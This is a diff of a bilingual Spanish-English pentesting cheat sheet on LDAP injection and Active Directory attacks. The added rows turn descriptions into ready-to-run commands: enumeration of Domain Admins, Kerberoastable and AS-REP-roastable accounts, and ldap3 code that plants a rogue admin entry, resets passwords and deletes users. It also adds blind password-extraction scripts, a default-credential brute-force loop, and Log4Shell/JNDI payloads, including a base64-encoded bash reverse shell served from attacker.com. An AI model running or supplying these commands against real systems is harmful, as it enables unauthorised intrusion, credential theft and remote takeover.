@@ -26,24 +26,18 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Anonymous bind + base info | `ldapsearch -H ldap://target -x -s base -b ""` | RootDSE. |
-| Discover naming context | `ldapsearch ... -b "" "(objectClass=*)" namingContexts` | Find base DN. |
-| Enumerate todos los users | `ldapsearch -H ldap://target -x -b "dc=target,dc=com" "(objectClass=user)"` | If anon allowed. |
-| AD users | `ldapsearch ... -b "DC=target,DC=com" "(&(objectClass=user)(objectCategory=person))"` | AD-specific. |
-| Authenticated bind | `ldapsearch -H ldap://target -D "cn=admin,dc=target" -w password ...` | Simple bind con creds. |
-| AD authenticated | `ldapsearch -H ldap://dc.target.com -D "user@target.com" -w pass -b "DC=target,DC=com" ...` | AD bind format. |
-| Specific attribute | `ldapsearch ... "(uid=*)" mail memberOf` | Solo specific attrs. |
-| Filter with wildcard | `"(uid=*)"` | All. |
-| Filter compound | `"(&(objectClass=user)(memberOf=cn=admins,...))"` | AND. |
-| Filter substring | `"(cn=admin*)"` | Prefix match. |
-| Schema enumeration | `ldapsearch ... -b "cn=schema" "(objectClass=*)"` | Schema dump. |
-| Subschema | `ldapsearch ... -b "" -s base subschemaSubentry` | Pointer to schema. |
-| Read passwords (if exposed) | `ldapsearch ... "(uid=admin)" userPassword` | OpenLDAP — usually hashed. |
-| Output LDIF format | Default `ldapsearch` outputs LDIF | Standard format. |
-| Single-line output | `-LLL -o ldif-wrap=no` | Easy parsing. |
-| StartTLS | `-Z` flag | Upgrade plain to TLS. |
-| LDAPS | `-H ldaps://target:636` | TLS direct. |
-| SASL bind | `-Y SCRAM-SHA-1` etc | Modern SASL mechanisms. |
+| `ldapsearch -H ldap://target -x -s base -b ""` | RootDSE + naming contexts | Anonymous bind initial recon. |
+| `ldapsearch -H ldap://target -x -b "" -s base namingContexts` | Lista bases DN del server | Find root path. |
+| `ldapsearch -H ldap://target -x -b "dc=target,dc=com" "(objectClass=user)"` | Enumera todos users si anonymous | OpenLDAP. |
+| `ldapsearch -H ldap://dc.target.com -D "user@target.com" -w pass -b "DC=target,DC=com" "(objectClass=user)"` | AD authenticated full enum | AD bind format. |
+| `ldapsearch -H ldap://target -D "cn=admin,dc=target" -w pass -b "dc=target" "(uid=*)" mail memberOf` | Specific attrs (filtered output) | Reduce ruido. |
+| `ldapsearch -H ldap://target -x -b "DC=target,DC=com" "(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=com))"` | Lista Domain Admins (AD) | AD privesc recon. |
+| `ldapsearch -H ldap://target -x -b "DC=target,DC=com" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName` | SPNs (Kerberoasting targets) | AD recon. |
+| `ldapsearch -H ldap://target -x -b "DC=target,DC=com" "(userAccountControl:1.2.840.113556.1.4.803:=8388608)" sAMAccountName` | AD users con flag DONT_REQ_PREAUTH (AS-REP roastable) | AD AS-REP roasting. |
+| `ldapsearch -H ldap://target -x -b "cn=schema" "(objectClass=*)"` | Schema dump | Pre-attack schema enum. |
+| `ldapsearch -H ldap://target -x -LLL -o ldif-wrap=no "(uid=*)"` | Single-line output (parseable) | Pipe-friendly. |
+| `ldapsearch -H ldaps://target:636 -x -b "..."` | LDAPS direct (TLS) | Encrypted. |
+| `ldapsearch -H ldap://target -x -Z -b "..."` | StartTLS upgrade | Plain → TLS. |
 ^ldap-tool-ldapsearch
 
 ___
@@ -52,43 +46,31 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Install | `pip install ldap3` | Pure Python, no dependencies. |
-| Connect anonymous | `from ldap3 import Server, Connection; conn = Connection(Server('ldap://target')); conn.bind()` | Standard. |
-| Authenticated | `Connection(server, user='cn=admin,...', password='...').bind()` | Simple bind. |
-| Search | `conn.search('dc=target,dc=com', '(uid=*)')` | Standard search. |
-| All attributes | `conn.search('...', '(objectClass=*)', attributes=['*'])` | All attrs. |
-| Specific attrs | `attributes=['uid', 'mail', 'memberOf']` | Filtered. |
-| Iterate results | `for entry in conn.entries: print(entry)` | Python objects. |
-| Add entry | `conn.add('cn=newuser,...', 'inetOrgPerson', {...})` | Modify operation. |
-| Modify entry | `conn.modify('cn=user,...', {'userPassword': [(MODIFY_REPLACE, ['newpass'])]})` | Update. |
-| Delete entry | `conn.delete('cn=user,...')` | Remove. |
-| Custom blind extraction | Loop over chars + check response | Programmable. |
-| Connection pooling | Use `Connection(server, auto_bind=True)` | Performance. |
-| Async support | `ldap3.async_strategy` | Modern. |
-| TLS support | `Server(host, use_ssl=True)` | LDAPS. |
-| StartTLS | `conn.start_tls()` | Upgrade. |
+| `pip install ldap3` | Install lib | Primera vez. |
+| `python3 -c "from ldap3 import Server, Connection; c=Connection(Server('ldap://target'),auto_bind=True); c.search('dc=target,dc=com','(objectClass=*)',attributes=['*']); print(c.entries)"` | Anonymous bind + full search en one-liner | Quick recon. |
+| `Connection(server, user='cn=admin,dc=target,dc=com', password='pass', auto_bind=True)` | Authenticated bind simple | Standard auth. |
+| `c.search('dc=target,dc=com', '(&(uid=admin)(userPassword=A*))')` y check `c.entries` | Boolean blind oracle | Custom blind extraction. |
+| `c.add('cn=newuser,dc=target,dc=com', 'inetOrgPerson', {'userPassword':'attacker','memberOf':'cn=admins,dc=target,dc=com'})` | Add entry malicioso (post-bind admin) | Persistence. |
+| `c.modify('cn=user,dc=target,dc=com', {'userPassword':[(MODIFY_REPLACE, ['newpass'])]})` | Modify password remoto | Atacante con write access. |
+| `c.delete('cn=victim,dc=target,dc=com')` | Delete entry | Destructive (con cuidado). |
+| `Server('ldaps://target', use_ssl=True)` | LDAPS connection | TLS. |
 ^ldap-tool-ldap3
 
-### Script Python blind extraction completo
+### Script Python blind extraction
 
 ```python
 from ldap3 import Server, Connection
 import string
 
-URL = "https://target/login"  # ejemplo HTTP-based
-
-# Si LDAP directo:
 server = Server('ldap://target.com')
 conn = Connection(server, auto_bind=True)
 
-# Blind char-by-char on userPassword
 chars = string.ascii_lowercase + string.digits
 result = ""
 
 while True:
     found = False
     for c in chars:
-        # Filter inject
         f = f"(&(uid=admin)(userPassword={result}{c}*))"
         conn.search('dc=target,dc=com', f)
         if conn.entries:
@@ -108,45 +90,36 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| JNDI-Injection-Exploit (welk1n) | `git clone https://github.com/welk1n/JNDI-Injection-Exploit` | Java-based. |
-| JNDIExploit setup | `java -jar JNDIExploit-1.4-SNAPSHOT.jar -i attacker.com -p 1389` | Listen 1389 LDAP. |
-| Payload generation | `${jndi:ldap://attacker.com:1389/Basic/Command/Base64/<b64-cmd>}` | Standard format. |
-| Reverse shell | `${jndi:ldap://attacker.com:1389/Basic/ReverseShell/IP/PORT}` | Direct. |
-| TomcatBypass / TomcatEcho | Variantes para Tomcat-specific runtimes | Stack-aware. |
-| Spring bypass | Spring memory shell injection | Persistencia. |
-| Marshalsec | `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8888/#Exploit"` | Old school. |
-| Log4j-scan (Fullhunt) | Scanner para detection | https://github.com/fullhunt/log4j-scan |
-| nuclei templates | `nuclei -t cves/CVE-2021-44228.yaml` | Bulk scanning. |
-| Burp Collaborator | Use built-in DNS canary | Detection oracle. |
-| `ysoserial` LDAP | `java -jar ysoserial.jar JRMPClient` | Combine con LDAP referral. |
-| h2csmuggler + JNDI | Bypass WAF + inject | Combo. |
+| `git clone https://github.com/welk1n/JNDI-Injection-Exploit && cd JNDI-Injection-Exploit && mvn package -DskipTests` | Build JNDI Exploit Kit | Primera vez. |
+| `java -jar target/JNDI-Injection-Exploit-*-all.jar -C "id" -A attacker.com` | Hostear LDAP server con payload `id` | Setup pre-trigger. |
+| `java -jar target/JNDI-Injection-Exploit-*-all.jar -C "bash -c {echo,$(echo 'bash -i >& /dev/tcp/IP/4444 0>&1' \| base64 -w0)}\|{base64,-d}\|bash" -A attacker.com` | Reverse shell payload base64 | RCE con reverse shell. |
+| `java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8888/#Exploit"` | marshalsec server (old-school) | Alt. |
+| `git clone https://github.com/fullhunt/log4j-scan && python3 log4j-scan.py -u https://target/` | Auto-detection Log4Shell | Pre-attack scanner. |
+| `nuclei -u https://target -t cves/2021/CVE-2021-44228.yaml` | nuclei template Log4Shell | Bulk scan. |
+| `curl -H 'User-Agent: ${jndi:ldap://$(burp-collaborator-id).oastify.com/x}' https://target/` | Burp Collaborator canary | Detection blind. |
+| `python3 -m http.server 8888` (host malicious class) | HTTP server para entregar exploit class | Post-LDAP-trigger. |
 ^ldap-tool-jndi
 
 ___
 
 ## Wordlists y Resources
 
-| **Wordlist** | **Path / Repo** | **Uso** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| PayloadsAllTheThings - LDAP | `PayloadsAllTheThings/LDAP Injection/` | Standard payloads. |
-| HackTricks - LDAP | https://book.hacktricks.xyz/pentesting-web/ldap-injection | Comprehensive. |
-| SecLists - LDAP | `SecLists/Fuzzing/LDAP/` | Fuzzing payloads. |
-| Burp Intruder built-in | "LDAP Injection" payload set | Pro feature. |
-| LDAP injection cheatsheet | OWASP guide | Defenses. |
-| AD attribute list | `samAccountName`, `userAccountControl`, etc | AD-specific. |
-| Common groups DN | `CN=Domain Admins,...`, `CN=Enterprise Admins,...` | Privesc enum. |
-| Bind credentials wordlist | `cn=admin/admin`, `cn=Manager/secret` | Default creds. |
-| JNDI bypass payloads | Log4Shell evasions wordlist | WAF bypass. |
-| AD attack tools | `BloodHound`, `Impacket`, `CrackMapExec` | Post-LDAP enum. |
+| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && ls "PayloadsAllTheThings/LDAP Injection/"` | Payloads ready | Foundation. |
+| `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt` | Wordlist Intruder | Burp fuzz. |
+| `cat /usr/share/seclists/Fuzzing/LDAP/* \| sort -u > ldap-fuzz.txt` | SecLists LDAP combinado | Bulk fuzz. |
+| Browser → https://book.hacktricks.xyz/pentesting-web/ldap-injection | Reference comprehensive | Lookup. |
+| `for u in admin manager root cn=admin cn=Manager 'cn=Directory Manager'; do for p in '' admin password secret manager; do ldapsearch -H ldap://target -x -D "$u" -w "$p" -b "" -s base 2>&1 \| grep -E 'success\|invalid' ; done; done` | Default LDAP creds bulk probe | Foothold. |
+| `ldapdomaindump -u 'target.com\user' -p pass dc.target.com -o ad-dump/` | AD comprehensive dump (post-bind) | Post-recon. |
+| `bloodhound-python -u user -p pass -d target.com -ns dc.target.com -c All -o /tmp/bh` | BloodHound LDAP collection | Post-foothold AD. |
 ^ldap-tool-wordlists
 
 ### Manual one-liner blind extraction
 
 ```bash
-# Iterate chars en HTTP form con LDAP backend
 TARGET="https://target/login"
-for c in {a..z}; do
-  # Try if password starts with $c
+for c in {a..z} {0..9}; do
   R=$(curl -s -X POST "$TARGET" -d "username=admin)(userPassword=${c}*&password=x")
   if echo "$R" | grep -q "Welcome"; then
     echo "First char: $c"
